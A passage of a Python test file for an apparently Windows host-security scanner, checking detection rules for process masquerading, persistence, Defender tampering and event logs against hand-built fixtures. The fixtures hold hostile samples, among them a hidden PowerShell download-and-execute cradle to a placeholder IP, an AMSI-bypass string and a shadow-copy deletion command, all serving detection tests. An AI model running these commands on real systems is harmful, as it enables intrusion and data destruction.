"""Detection rules against hand-built facts: each case states what must be flagged and, as often,
what must be left alone. No part of this file touches the real system."""

import sys
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from hostguard import pe, util  # noqa: E402
from hostguard.collect import eventlogs as logs  # noqa: E402
from hostguard.detect import browsers as d_browsers  # noqa: E402
from hostguard.detect import cmdline as cl  # noqa: E402
from hostguard.detect import content  # noqa: E402
from hostguard.detect import eventlogs as d_events  # noqa: E402
from hostguard.detect import files as d_files  # noqa: E402
from hostguard.detect import memory as d_memory  # noqa: E402
from hostguard.detect import network as d_network  # noqa: E402
from hostguard.detect import persistence as d_persist  # noqa: E402
from hostguard.detect import processes as d_proc  # noqa: E402
from hostguard.detect import system as d_system  # noqa: E402
from hostguard.model import verdict  # noqa: E402

S32 = r"C:\Windows\System32"
TEMP = r"C:\Users\a\AppData\Local\Temp"
MS = {"status": "Valid", "signer": "CN=Microsoft Windows, O=Microsoft Corporation", "issuer": "", "is_os": True}
VENDOR = {"status": "Valid", "signer": "CN=Example Software Ltd, O=Example", "issuer": "", "is_os": False}
UNSIGNED = {"status": "NotSigned", "signer": "", "issuer": "", "is_os": False}
UNREADABLE = {"status": "Unreadable", "signer": "", "issuer": "", "is_os": False}
MISSING = {"status": "Missing", "signer": "", "issuer": "", "is_os": False}
CRADLE = "powershell -w hidden -nop -c \"" + "IE" + "X (New-Object Net.WebClient).Download" + "String('http://198.51.100.9/a')\""
NOW = time.time()


def sigs_for(**by_path):
    return {p.lower(): s for p, s in by_path.items()}


def proc(pid, name, path="", cmdline="", ppid=0, created=None):
    return {"pid": pid, "ppid": ppid, "name": name, "path": path, "cmdline": cmdline or (f'"{path}"' if path else ""),
            "created": created if created is not None else NOW - 100 + pid / 1000.0, "user": "PC\\a", "integrity": "medium",
            "accessible": bool(path)}


def rules(findings):
    return sorted({f.rule for f in findings})


def one(findings, rule):
    hits = [f for f in findings if f.rule == rule]
    assert len(hits) == 1, f"expected exactly one {rule}, got {len(hits)} among {rules(findings)}"
    return hits[0]


class Processes(unittest.TestCase):
    def run_rules(self, procs, sig_map=None, self_pids=()):
        return d_proc.detect({"processes": procs}, sig_map or {}, {"self_pids": set(self_pids)})

    def test_system_name_from_the_wrong_folder(self):
        bad = TEMP + r"\svchost.exe"
        good = S32 + r"\svchost.exe"
        fs = self.run_rules([proc(10, "svchost.exe", bad), proc(11, "svchost.exe", good)], sigs_for(**{bad: UNSIGNED, good: MS}))
        f = one(fs, "proc.masquerade.system_name")
        self.assertEqual((f.severity, f.entity["pid"]), ("critical", 10))
        self.assertIn("quarantine", f.actions)

    def test_a_genuine_microsoft_binary_copied_elsewhere_is_only_odd(self):
        path = r"C:\Tools\cmd.exe"
        self.assertEqual(one(self.run_rules([proc(10, "cmd.exe", path)], sigs_for(**{path: MS})), "proc.masquerade.system_name").severity, "medium")

    def test_lookalike_names(self):
        path = r"C:\ProgramData\svch0st.exe"
        fs = self.run_rules([proc(10, "svch0st.exe", path), proc(11, "sihost.exe", S32 + r"\sihost.exe"), proc(12, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe")],
                            sigs_for(**{path: UNSIGNED}))
        self.assertEqual(one(fs, "proc.masquerade.lookalike").entity["pid"], 10)
        self.assertNotIn(11, [f.entity["pid"] for f in fs])
        self.assertNotIn(12, [f.entity["pid"] for f in fs])

    def test_unsigned_only_matters_in_user_writable_places_and_unknown_is_not_unsigned(self):
        t, pf, alias = TEMP + r"\tool.exe", r"C:\Program Files\App\tool.exe", r"C:\Users\a\AppData\Local\Microsoft\WindowsApps\python.exe"
        fs = self.run_rules([proc(10, "tool.exe", t), proc(11, "tool.exe", pf), proc(12, "python.exe", alias)],
                            sigs_for(**{t: UNSIGNED, pf: UNSIGNED, alias: UNREADABLE}))
        f = one(fs, "proc.unsigned.user_writable")
        self.assertEqual((f.entity["pid"], f.severity), (10, "medium"))

    def test_double_extension_and_deleted_image(self):
        a, b = r"C:\Users\a\Downloads\invoice.pdf.exe", TEMP + r"\gone.exe"
        fs = self.run_rules([proc(10, "invoice.pdf.exe", a), proc(11, "gone.exe", b)], sigs_for(**{a: UNSIGNED, b: MISSING}))
        self.assertEqual(one(fs, "proc.name.double_extension").severity, "high")
        self.assertEqual(one(fs, "proc.image.deleted").entity["pid"], 11)

    def test_command_line_rules_and_the_clickfix_bump(self):
        ps = S32 + r"\WindowsPowerShell\v1.0\powershell.exe"
        procs = [proc(1, "explorer.exe", r"C:\Windows\explorer.exe", created=NOW - 5000),
                 proc(2, "cmd.exe", S32 + r"\cmd.exe", created=NOW - 4000),
                 proc(10, "powershell.exe", ps, CRADLE, ppid=1), proc(11, "powershell.exe", ps, CRADLE, ppid=2)]
        fs = [f for f in self.run_rules(procs, sigs_for(**{ps: MS})) if f.rule == "proc.cmd.download_cradle"]
        by_pid = {f.entity["pid"]: f for f in fs}
        self.assertEqual((by_pid[10].severity, by_pid[10].confidence, by_pid[10].tags), ("critical", "high", ["clickfix-style"]))
        self.assertEqual(by_pid[11].severity, "high")
        self.assertEqual(by_pid[10].evidence["urls"], ["http://198.51.100.9/a"])

    def test_a_published_installer_is_reported_low(self):
        ps = S32 + r"\WindowsPowerShell\v1.0\powershell.exe"
        cmd = 'powershell -c "irm https://astral.sh/uv/install.ps1 | ' + 'iex"'
        f = one(self.run_rules([proc(10, "powershell.exe", ps, cmd)], sigs_for(**{ps: MS})), "proc.cmd.download_cradle")
        self.assertEqual((f.severity, f.tags), ("low", ["known-installer"]))

    def test_parent_child_rules(self):
        word, ps, cmd, chrome = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", S32 + r"\WindowsPowerShell\v1.0\powershell.exe", S32 + r"\cmd.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        procs = [proc(1, "WINWORD.EXE", word, created=NOW - 900), proc(2, "chrome.exe", chrome, created=NOW - 900),
                 proc(3, "winlogon.exe", "", created=NOW - 9000),
                 proc(10, "powershell.exe", ps, "powershell -c Get-Date", ppid=1),
                 proc(11, "cmd.exe", cmd, r'cmd.exe /d /c "C:\x\host.bat" chrome-extension://abc/ --parent-window=0', ppid=2),
                 proc(12, "cmd.exe", cmd, "cmd.exe", ppid=3)]
        fs = self.run_rules(procs, sigs_for(**{ps: MS, cmd: MS, word: MS, chrome: VENDOR}))
        self.assertEqual(one(fs, "proc.parent.office_shell").entity["pid"], 10)
        self.assertEqual(one(fs, "proc.parent.winlogon_shell").severity, "critical")
        self.assertNotIn(11, [f.entity["pid"] for f in fs], "a browser's native-messaging host is normal")

    def test_a_reused_parent_pid_is_not_a_parent(self):
        word, ps = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", S32 + r"\WindowsPowerShell\v1.0\powershell.exe"
        procs = [proc(1, "WINWORD.EXE", word, created=NOW), proc(10, "powershell.exe", ps, "powershell", ppid=1, created=NOW - 500)]
        self.assertEqual(self.run_rules(procs, sigs_for(**{ps: MS, word: MS})), [])

    def test_remote_access_tools(self):
        any_, ns, ts = r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe", r"C:\Users\a\AppData\Roaming\Helper\client32.exe", r"C:\Program Files\Tailscale\tailscaled.exe"
        fs = self.run_rules([proc(10, "AnyDesk.exe", any_), proc(11, "client32.exe", ns), proc(12, "tailscaled.exe", ts)],
                            sigs_for(**{any_: VENDOR, ns: VENDOR, ts: VENDOR}))
        sev = {f.entity["pid"]: f.severity for f in fs if f.rule == "proc.remote_access_tool"}
        self.assertEqual(sev, {10: "medium", 11: "critical", 12: "low"})

    def test_hostguard_skips_itself(self):
        t = TEMP + r"\tool.exe"
        self.assertEqual(self.run_rules([proc(10, "tool.exe", t)], sigs_for(**{t: UNSIGNED}), self_pids=[10]), [])


def entry(kind, name, command="", location=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", image=None, **meta):
    img, args = util.split_command(command) if command else ("", "")
    return {"kind": kind, "location": location, "name": name, "command": command, "image": img if image is None else image,
            "args": args, "meta": meta}


class Persistence(unittest.TestCase):
    def run_rules(self, entries, sig_map=None, **ctx):
        return d_persist.detect({"entries": entries}, sig_map or {}, ctx)

    def test_unsigned_autorun_in_a_user_folder(self):
        roam, temp, pf = r"C:\Users\a\AppData\Roaming\upd\upd.exe", TEMP + r"\x.exe", r"C:\Program Files\App\app.exe"
        fs = self.run_rules([entry("run_key", "Upd", f'"{roam}"'), entry("run_key", "X", temp), entry("run_key", "App", f'"{pf}"'),
                             entry("service", "Svc", roam, location=r"HKLM\System\CurrentControlSet\Services\Svc", raw_image_path=roam)],
                            sigs_for(**{roam: UNSIGNED, temp: UNSIGNED, pf: UNSIGNED}))
        sev = {f.evidence["name"]: f.severity for f in fs if f.rule == "persist.unsigned_user_writable"}
        self.assertEqual(sev, {"Upd": "medium", "X": "high", "Svc": "high"})
        self.assertIn("disable_autorun", one([f for f in fs if f.evidence["name"] == "Upd"], "persist.unsigned_user_writable").actions)

    def test_an_app_execution_alias_is_not_called_unsigned(self):
        alias = r"C:\Users\a\AppData\Local\Microsoft\WindowsApps\pythonw.exe"
        self.assertEqual(self.run_rules([entry("task", r"\My task", f'{alias} "C:\\x\\serve.py"', location="Task Scheduler")],
                                        sigs_for(**{alias: UNREADABLE})), [])

    def test_attack_command_as_an_autorun(self):
        f = one(self.run_rules([entry("run_key", "Updater", CRADLE)]), "persist.cmd.download_cradle")
        self.assertEqual((f.severity, f.confidence), ("high", "high"))
        self.assertIn("T1547.001", f.mitre)

    def test_disabled_entries_are_marked_down(self):
        f = one(self.run_rules([entry("run_key", "Updater", CRADLE, disabled=True)]), "persist.cmd.download_cradle")
        self.assertEqual((f.severity, f.tags), ("low", ["disabled"]))

    def test_winlogon(self):
        loc = r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
        normal = [entry("winlogon", "Shell", "explorer.exe", location=loc), entry("winlogon", "Userinit", r"C:\WINDOWS\system32\userinit.exe,", location=loc)]
        self.assertEqual(self.run_rules(normal), [])
        f = one(self.run_rules([entry("winlogon", "Shell", r"explorer.exe, C:\Users\Public\x.exe", location=loc)]), "persist.winlogon")
        self.assertEqual(f.severity, "critical")
        self.assertEqual(one(self.run_rules([entry("winlogon", "Shell", "explorer.exe", location=loc.replace("HKLM", "HKCU"))]), "persist.winlogon").severity, "critical")

    def test_debugger_hijacks(self):
        base = r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        fs = self.run_rules([entry("ifeo_debugger", "Debugger", S32 + r"\cmd.exe", location=base + r"\sethc.exe", target_image="sethc.exe"),
                             entry("ifeo_debugger", "Debugger", r'"C:\Tools\procexp64.exe"', location=base + r"\taskmgr.exe", target_image="taskmgr.exe"),
                             entry("ifeo_debugger", "Debugger", r"C:\Users\Public\dbg.exe", location=base + r"\chrome.exe", target_image="chrome.exe")])
        self.assertEqual(one(fs, "persist.ifeo.accessibility").severity, "critical")
        self.assertEqual(one(fs, "persist.ifeo.debugger_tool").severity, "info")
        self.assertEqual(one(fs, "persist.ifeo.debugger").severity, "high")

    def test_services(self):
        pipe = r"%COMSPEC% /c echo abc > \\.\pipe\abc"
        dll = r"C:\ProgramData\x\svc.dll"
        fs = self.run_rules([entry("service", "getsys", pipe, raw_image_path=pipe),
                             entry("service", "Hosted", S32 + r"\svchost.exe -k netsvcs", raw_image_path=S32 + r"\svchost.exe -k netsvcs", service_dll=dll)],
                            sigs_for(**{dll: UNSIGNED, S32 + r"\svchost.exe": MS}))
        self.assertEqual(one(fs, "persist.service.shell").severity, "critical")
        self.assertEqual(one(fs, "persist.service.dll_unsigned").evidence["service_dll"], dll)

    def test_wmi_subscriptions(self):
        fs = self.run_rules([entry("wmi_subscription", "Updater", "cmd /c C:\\x.bat", location="WMI root/subscription", consumer_class="CommandLineEventConsumer"),
                             entry("wmi_subscription", "SCM Event Log Consumer", "", location="WMI root/subscription", consumer_class="NTEventLogEventConsumer")])
        self.assertEqual([(f.rule, f.severity) for f in fs], [("persist.wmi.consumer", "high")])

    def test_elevated_task_only_when_the_file_is_really_replaceable(self):
        image = r"C:\ProgramData\Vendor\agent.exe"
        task = entry("task", r"\Vendor\Agent", f'"{image}"', location="Task Scheduler", runlevel="Highest")
        original = d_persist.winapi.can_replace
        try:
            d_persist.winapi.can_replace = lambda p: False
            self.assertEqual(self.run_rules([task], sigs_for(**{image: VENDOR})), [])
            d_persist.winapi.can_replace = lambda p: True
            self.assertEqual(one(self.run_rules([task], sigs_for(**{image: VENDOR})), "persist.task.elevated_user_writable").severity, "medium")
        finally:
            d_persist.winapi.can_replace = original

    def test_misc_hijack_points(self):
        lsa = r"HKLM\System\CurrentControlSet\Control\Lsa"
        evil = S32 + r"\evilpkg.dll"
        com = r"C:\Users\a\AppData\Roaming\x\shell.dll"
        fs = self.run_rules([
            {"kind": "lsa_package", "location": lsa, "name": "Security Packages", "command": "evilpkg", "image": evil, "args": "", "meta": {}},
            {"kind": "lsa_package", "location": lsa, "name": "Security Packages", "command": "kerberos", "image": S32 + r"\kerberos.dll", "args": "", "meta": {}},
            entry("com_hijack", "{AAAA}", com, location=r"HKCU\Software\Classes\CLSID\{AAAA}\InprocServer32", machine_wide=True),
            entry("shell_open_hijack", "ms-settings", "cmd.exe", location=r"HKCU\Software\Classes\ms-settings\shell\open\command"),
            entry("boot_execute", "BootExecute", "autocheck autochk *", location="HKLM\\x"),
            entry("boot_execute", "BootExecute", "evil.exe", location="HKLM\\x"),
        ], sigs_for(**{evil: UNSIGNED, com: UNSIGNED}))
        self.assertEqual(one(fs, "persist.lsa_package").severity, "high")
        self.assertEqual(one(fs, "persist.com_hijack").severity, "high")
        self.assertEqual(one(fs, "persist.shell_open_hijack").severity, "critical")
        self.assertEqual(one(fs, "persist.boot_execute").evidence["command"], "evil.exe")

    def test_background_transfer_jobs(self):
        fs = self.run_rules([entry("bits_job", "Edge Component Updater", "", location="BITS", urls=["http://msedge.b.tlu.dl.delivery.mp.microsoft.com/files/x"]),
                             entry("bits_job", "odd", "", location="BITS", urls=["http://203.0.113.5/payload.bin"]),
                             entry("bits_job", "notify", r"C:\Users\Public\run.exe", location="BITS", urls=[])])
        self.assertEqual(one(fs, "persist.bits.odd_source").evidence["name"], "odd")
        self.assertEqual(one(fs, "persist.bits.notify_command").severity, "high")

    def test_own_entry_and_baseline_inventory(self):
        mine = entry("run_key", "HostGuard", r'"C:\Users\a\hostguard\run.py" monitor run')
        self.assertEqual(self.run_rules([mine], own_marker=r"c:\users\a\hostguard"), [])
        inv = d_persist.inventory([mine, entry("driver", "drv", r"\SystemRoot\System32\drivers\x.sys")])
        self.assertEqual(len(inv), 1)


class System(unittest.TestCase):
    ON = {"AMServiceEnabled": True, "AntivirusEnabled": True, "RealTimeProtectionEnabled": True, "BehaviorMonitorEnabled": True,
          "IoavProtectionEnabled": True, "OnAccessProtectionEnabled": True, "IsTamperProtected": True, "AMRunningMode": "Normal",
          "AntivirusSignatureAge": 0, "QuickScanAge": 1}

    def defender(self, status=None, prefs=None, products=None, registry=None, **extra):
        return d_system.detect_defender({"defender": {"status": status if status is not None else dict(self.ON), "prefs": prefs or {},
                                                      "products": products or [], **extra}, "registry": registry or {}})

    def test_healthy_defender_is_quiet(self):
        self.assertEqual(self.defender(), [])

    def test_realtime_protection_off(self):
        off = dict(self.ON, RealTimeProtectionEnabled=False)
        self.assertEqual(one(self.defender(off), "defender.realtime_off").severity, "critical")
        other = [{"displayName": "Other AV", "productState": 0x041000}]
        self.assertEqual(rules(self.defender(off, products=other)), ["defender.passive"])

    def test_weakened_defender(self):
        fs = self.defender(dict(self.ON, IsTamperProtected=False, AntivirusSignatureAge=20), prefs={"DisableScriptScanning": True})
        self.assertEqual({f.rule: f.severity for f in fs}, {"defender.tamper_off": "medium", "defender.signatures_old": "high",
                                                           "defender.script_scanning_off": "high"})

    def test_exclusions(self):
        prefs = {"ExclusionPath": [r"C:\Users\Public", r"C:\dev\project\build"], "ExclusionExtension": ["N/A: Must be an administrator to view exclusions"]}
        sev = {f.evidence["value"]: f.severity for f in self.defender(prefs=prefs) if f.rule == "defender.exclusion"}
        self.assertEqual(sev, {r"C:\Users\Public": "high", r"C:\dev\project\build": "medium"})

    def test_policy_values_that_try_to_disable_defender(self):
        fs = self.defender(registry={"defender_policy": {"DisableAntiSpyware": 1, "DisableRealtimeMonitoring": 0}})
        self.assertEqual([(f.rule, f.severity) for f in fs], [("defender.policy_disable", "high")])

    def test_detection_wording_and_agent_hint(self):
        cmd = "CmdLine:_C:\\Program Files\\Git\\bin\\bash.exe -c source /c/Users/a/.claude/shell-snapshots/snapshot-bash-1.sh && echo hi"
        blocked = d_system.detection_finding("Trojan:Win32/ClickFix.DCS!MTB", cmd, NOW, "Remove", False, "eventlogs")
        self.assertIn("blocked a command", blocked.title)
        self.assertEqual((blocked.severity, blocked.confidence, blocked.tags), ("high", "low", ["ai-agent-command"]))
        self.assertIn("launcher_hint", blocked.evidence)
        self.assertEqual(blocked.evidence["launched_program"], r"C:\Program Files\Git\bin\bash.exe")
        on_disk = d_system.detection_finding("Trojan:Win32/Wacatac.B!ml", "file:_C:\\Users\\a\\Downloads\\setup.exe", NOW, None, True, "system")
        self.assertEqual((on_disk.severity, on_disk.entity["path"], on_disk.actions), ("critical", r"C:\Users\a\Downloads\setup.exe", ["quarantine"]))
        pua = d_system.detection_finding("PUA:Win32/Bundler", "file:_C:\\x.exe", NOW, "Quarantine", False, "system")
        self.assertEqual(pua.severity, "low")
        self.assertEqual(blocked.key, d_system.detection_finding("Trojan:Win32/ClickFix.DCS!MTB", cmd + "  ", NOW + 5, None, False, "system").key,
                         "the same detection read from two sources must collapse into one finding")

    def test_hardening_gaps_are_posture_but_tampering_is_not(self):
        facts = {"registry": {"uac": {"EnableLUA": 0}, "rdp": {"deny": 0, "nla": 1, "port": 3389}, "wdigest": 1, "hvci": 1,
                              "lsa": {"RunAsPPL": 1}, "ps_scriptblock_logging": 1, "proc_cmdline_audit": 1},
                 "system": {"firewall": [{"name": "Public", "enabled": False}]}}
        cat = {f.rule: f.category for f in d_system.detect_posture(facts)}
        self.assertEqual(cat, {"posture.uac.disabled": "posture", "posture.firewall.off": "posture", "posture.rdp.enabled": "posture",
                               "config.wdigest_cleartext": "config"})

    def test_accounts(self):
        users = [{"name": "a", "enabled": True, "sid": "S-1-5-21-1-1001"}, {"name": "Administrator", "enabled": True, "sid": "S-1-5-21-1-500"},
                 {"name": "support$", "enabled": True, "sid": "S-1-5-21-1-1005"},
                 {"name": "work", "enabled": True, "sid": "S-1-5-21-1-1002", "pwset": util.iso(NOW - 3 * 86400)},
                 {"name": "old", "enabled": True, "sid": "S-1-5-21-1-1003", "pwset": util.iso(NOW - 300 * 86400)},
                 {"name": "Guest", "enabled": False, "sid": "S-1-5-21-1-501"}]
        groups = {"S-1-5-32-544": {"name": "Administrators", "members": [{"name": "PC\\a", "sid": "S-1-5-21-1-1001"}, {"name": "PC\\support$", "sid": "S-1-5-21-1-1005"}]},
                  "S-1-5-32-555": {"name": "Remote Desktop Users", "members": [{"name": "PC\\work", "sid": "S-1-5-21-1-1002"}]}}
        fs = d_system.detect_accounts({"accounts": {"current": "PC\\a", "users": users, "groups": groups}})
        self.assertEqual(one(fs, "account.hidden").severity, "high")
        self.assertEqual(one(fs, "account.builtin_admin_enabled").severity, "medium")
        self.assertEqual({f.evidence.get("password_set") is not None and f.severity for f in fs if f.rule == "account.other_user"}, {"medium", "low"})
        self.assertEqual(one(fs, "account.extra_admin").entity["name"], "support$")
        self.assertEqual(one(fs, "account.remote_group").evidence["members"], ["PC\\work"])
        self.assertNotIn("account.guest_enabled", rules(fs))

    def test_hosts_proxy_and_certificates(self):
        facts = {"hosts": {"entries": [{"ip": "192.168.1.5", "names": ["host.docker.internal"]}, {"ip": "127.0.0.1", "names": ["update.microsoft.com"]},
                                       {"ip": "10.0.0.7", "names": ["dev.local"]}]},
                 "proxy": {"user": {"enabled": True, "server": "127.0.0.1:8899", "pac": ""}, "machine": {"enabled": False, "server": "", "pac": "http://evil.example/p.pac"},
                           "policy": {"enabled": False, "server": "", "pac": ""}, "env": {}},
                 "certs": [{"thumbprint": "AA", "subject": "CN=mitmproxy", "stores": ["user"]},
                           {"thumbprint": "BB", "subject": "CN=Corp Root", "stores": ["machine"]},
                           {"thumbprint": "CC", "subject": "CN=Microsoft Root Certificate Authority 2011", "stores": ["machine"]},
                           {"thumbprint": "DD", "subject": "CN=DigiCert Global Root G2", "stores": ["authroot"]}]}
        fs = d_system.detect_config(facts)
        self.assertEqual(one(fs, "config.hosts.redirect").severity, "high")
        self.assertEqual(one(fs, "config.hosts.entry").evidence["names"], ["dev.local"])
        self.assertEqual(one(fs, "config.proxy.server").severity, "low")
        self.assertEqual(one(fs, "config.proxy.pac").severity, "high")
        self.assertEqual(one(fs, "config.root_cert.user").evidence["thumbprint"], "AA")
        self.assertEqual(one(fs, "config.root_cert.machine").evidence["thumbprint"], "BB")

    def test_typed_commands(self):
        installer = "irm https://claude.ai/install.ps1 | " + "iex"
        facts = {"typed": {"run_box": [CRADLE, "msinfo32"], "address_bar": [r"C:\Users\a\Documents"], "ps_history": [installer, "git status"]}}
        fs = d_system.detect_config(facts)
        run = [f for f in fs if "Run box" in f.title]
        self.assertEqual([(f.severity, f.tags) for f in run], [("critical", ["clickfix-style"])])
        hist = [f for f in fs if "PowerShell" in f.title]
        self.assertEqual([(f.severity) for f in hist], ["low"])
        self.assertIn("Claude Code", hist[0].title)

    def test_browser_policy_and_remote_software(self):
        fs = d_system.detect_config({"browser_policies": [{"browser": "Chrome", "scope": "HKLM", "policy": "ExtensionInstallForcelist", "value": "abc;https://x"}],
                                     "software": [{"name": "AnyDesk", "version": "9", "remote_access": True}, {"name": "7-Zip", "version": "24", "remote_access": False}]})
        self.assertEqual(one(fs, "config.browser_policy").severity, "high")
        self.assertEqual(one(fs, "posture.remote_software").evidence["programs"], ["AnyDesk 9"])

    def test_verdict_levels(self):
        def f(sev, cat="process", conf="high", status="open"):
            return {"severity": sev, "category": cat, "confidence": conf, "status": status}
        self.assertEqual(verdict([])["level"], "clean")
        self.assertEqual(verdict([f("high", "posture"), f("low")])["level"], "clean", "hardening gaps never raise the verdict")
        self.assertEqual(verdict([f("medium")])["level"], "review")
        self.assertEqual(verdict([f("high")])["level"], "suspicious")
        self.assertEqual(verdict([f("critical", conf="low")])["level"], "suspicious")
        self.assertEqual(verdict([f("critical")])["level"], "compromised")
        self.assertEqual(verdict([f("critical", status="allowed"), f("critical", status="contained")])["level"], "clean")


def ev(eid, data, t=None, record=None):
    ev.n += 1
    return {"id": eid, "time": t if t is not None else NOW - 3600, "record": record or ev.n, "provider": "", "level": 4, "channel": "",
            "user_sid": None, "data": data}


ev.n = 0


class Events(unittest.TestCase):
    def run_rules(self, **by_log):
        names = {"system": "System", "defender": logs.DEFENDER, "ps": logs.POWERSHELL, "psclassic": logs.PS_CLASSIC, "wmi": logs.WMI,
                 "bits": logs.BITS, "fw": logs.FIREWALL, "lsm": logs.RDP_LSM, "rcm": logs.RDP_RCM, "security": "Security", "sysmon": logs.SYSMON}
        return d_events.detect({"events": {names[k]: v for k, v in by_log.items()}}, {"own_marker": r"c:\users\a\hostguard"})

    def test_service_installs(self):
        fs = self.run_rules(system=[
            ev(7045, {"ServiceName": "abcdef", "ImagePath": r"%COMSPEC% /c echo x > \\.\pipe\x", "AccountName": "LocalSystem"}),
            ev(7045, {"ServiceName": "PSEXESVC", "ImagePath": r"C:\Windows\PSEXESVC.exe", "AccountName": "LocalSystem"}),
            ev(7045, {"ServiceName": "MpKsl1", "ImagePath": r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{x}\MpKslDrv.sys"}),
            ev(7045, {"ServiceName": "Tmp", "ImagePath": TEMP + r"\drv.sys", "AccountName": "LocalSystem"}),
            ev(7040, {"param1": "Microsoft Defender Antivirus Service", "param2": "auto start", "param3": "disabled", "param4": "WinDefend"}),
            ev(7040, {"param1": "BITS", "param2": "auto start", "param3": "demand start", "param4": "BITS"}),
            ev(104, {"Channel": "System", "SubjectUserName": "a"})])
        self.assertEqual(one(fs, "evt.service.shell").severity, "critical")
        self.assertEqual(one(fs, "evt.service.remote_exec").severity, "high")
        self.assertEqual(one(fs, "evt.service.temp_path").evidence["service"], "Tmp")
        self.assertEqual(one(fs, "evt.service.security_disabled").severity, "high")
        self.assertEqual(one(fs, "evt.log_cleared").severity, "high")
        self.assertEqual(len(one(fs, "evt.service.inventory").evidence["services"]), 3)

    def test_defender_events(self):
        excl = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\a\dev = 0x0"
        gone = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\tmp\x = 0x0"
        fs = self.run_rules(defender=[
            ev(1116, {"Threat Name": "Trojan:Win32/Bad.A", "Path": "file:_C:\\Users\\a\\Downloads\\a.exe", "Detection ID": "{1}"}, t=NOW - 500),
            ev(1117, {"Threat Name": "Trojan:Win32/Bad.A", "Detection ID": "{1}", "Action Name": "Quarantine"}, t=NOW - 490),
            ev(1116, {"Threat Name": "Trojan:Win32/Worse.B", "Path": "file:_C:\\Users\\a\\Downloads\\b.exe", "Detection ID": "{2}"}, t=NOW - 400),
            ev(1119, {"Threat Name": "Trojan:Win32/Worse.B", "Detection ID": "{2}"}, t=NOW - 390),
            ev(5001, {}, t=NOW - 300),
            ev(5007, {"Old Value": "", "New Value": excl}, t=NOW - 200),
            ev(5007, {"Old Value": "", "New Value": gone}, t=NOW - 200),
            ev(5007, {"Old Value": gone, "New Value": ""}, t=NOW - 100),
            ev(5007, {"Old Value": "", "New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1"}),
            ev(5007, {"Old Value": "x = 0x1", "New Value": r"HKLM\SOFTWARE\Microsoft\Windows Defender\UX Configuration\ToastOrSsoTrigger = 0x0"})])
        det = {f.evidence["threat"]: f for f in fs if f.rule == "defender.detection"}
        self.assertEqual((det["Trojan:Win32/Bad.A"].severity, det["Trojan:Win32/Bad.A"].actions), ("high", []))
        self.assertIn("quarantine", det["Trojan:Win32/Bad.A"].evidence["outcome"])
        self.assertEqual((det["Trojan:Win32/Worse.B"].severity, det["Trojan:Win32/Worse.B"].actions), ("critical", ["quarantine"]))
        self.assertEqual(one(fs, "evt.defender.rtp_disabled").severity, "high")
        added = {f.evidence["value"]: f.severity for f in fs if f.rule == "evt.defender.exclusion_added"}
        self.assertEqual(added, {r"C:\Users\a\dev": "medium", r"C:\tmp\x": "low"})
        self.assertEqual(one(fs, "evt.defender.setting_weakened").severity, "high")

    def test_powershell_logs(self):
        amsi = "[Ref].Assembly.GetType('System.Management.Automation." + cl.j("Amsi", "Utils") + "')"
        host = "\tHostName=ConsoleHost\n\tHostApplication=" + CRADLE + "\n\tEngineVersion=5.1\n"
        ours = "\tHostApplication=powershell.exe -File C:\\Users\\a\\hostguard\\hostguard\\ps\\collect.ps1 -What tasks\n\tEngineVersion=5.1\n"
        fs = self.run_rules(ps=[ev(4104, {"ScriptBlockText": amsi, "ScriptBlockId": "1", "Path": ""}), ev(4104, {"ScriptBlockText": "Get-Date", "Path": ""})],
                            psclassic=[ev(400, {"p0": "Available", "p2": host}), ev(400, {"p0": "Available", "p2": host}), ev(400, {"p2": ours})])
        self.assertEqual(one(fs, "evt.ps.ps.amsi_bypass").severity, "critical")
        again = one(fs, "evt.pscmd.cmd.download_cradle")
        self.assertEqual(again.evidence["times"], 2, "repeats collapse into one finding with a count")
        self.assertEqual(again.kind, "event")

    def test_remote_desktop_sessions(self):
        day = NOW - 86400
        fs = self.run_rules(lsm=[ev(21, {"User": "PC\\a", "Address": "LOCAL"}), ev(21, {"User": "PC\\a", "Address": "100.64.10.20"}, t=day),
                                 ev(25, {"User": "PC\\a", "Address": "203.0.114.50"})],
                            rcm=[ev(1149, {"Param1": "a@example.com", "Param2": "", "Param3": "100.64.10.20"}, t=day - 2)])
        by_src = {f.evidence["source"]: f for f in fs if f.rule == "evt.rdp.logon"}
        self.assertEqual(sorted(by_src), ["100.64.10.20", "203.0.114.50"], "the two logs describe one session, and LOCAL is not remote")
        self.assertEqual((by_src["100.64.10.20"].severity, by_src["100.64.10.20"].evidence["mesh_vpn_range"]), ("medium", True))
        self.assertEqual(by_src["203.0.114.50"].severity, "high")

    def test_security_log(self):
        fails = [ev(4625, {"IpAddress": "198.51.101.7", "TargetUserName": "a"}) for _ in range(20)]
        fs = self.run_rules(security=fails + [
            ev(4624, {"IpAddress": "198.51.101.7", "TargetUserName": "a", "LogonType": "10"}),
            ev(4720, {"TargetUserName": "backdoor", "SubjectUserName": "a"}),
            ev(4732, {"TargetSid": "S-1-5-32-544", "TargetUserName": "Administrators", "MemberSid": "S-1-5-21-1-1009", "SubjectUserName": "a"}),
            ev(4688, {"CommandLine": "vssadmin delete shadows /all /quiet", "NewProcessName": S32 + r"\vssadmin.exe", "SubjectUserName": "a"}),
            ev(1102, {"SubjectUserName": "a"})])
        self.assertEqual(one(fs, "evt.logon.bruteforce").severity, "critical")
        self.assertEqual(one(fs, "evt.logon.remote").severity, "high")
        self.assertEqual(one(fs, "evt.account.created").entity["name"], "backdoor")
        self.assertEqual(one(fs, "evt.account.privileged_group").severity, "high")
        self.assertEqual(one(fs, "evt.proc.impact.shadow_delete").severity, "critical")
        self.assertEqual(one(fs, "evt.log_cleared").title, "The Security log was cleared")

    def test_sysmon_wmi_firewall_bits(self):
        fs = self.run_rules(
            sysmon=[ev(10, {"TargetImage": S32 + r"\lsass.exe", "SourceImage": TEMP + r"\dump.exe", "GrantedAccess": "0x1010"}),
